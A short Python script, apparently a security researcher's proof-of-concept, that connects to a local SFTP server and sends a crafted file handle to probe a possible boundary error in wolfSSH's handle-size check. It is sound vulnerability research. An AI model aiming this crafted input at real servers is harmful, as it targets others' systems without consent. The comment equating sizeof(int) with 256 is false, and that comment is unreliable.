import paramiko
from math import pow
from struct import pack

hostname = "127.0.0.1"
port = 22222
username = "jill"
password = "upthehill"

# CrÃ©er un client SFTP
transport = paramiko.Transport((hostname, port))
transport.connect(username=username, password=password)
sftp = paramiko.SFTPClient.from_transport(transport)

with sftp.open("./test.txt", "w") as f:
    # if (sz + idx > maxSz || sz > WOLFSSH_MAX_HANDLE) 
    # What if sz == WOLFSSH_MAX_HANDLE ???
    # WOLFSSH_MAX_HANDLE == siezof(int) == 256
    f.handle = pack("d", pow(2, 8))

    # Just some minimal writes
    f.write("a" * 2)

# Fermer la connexion
sftp.close()
transport.close()
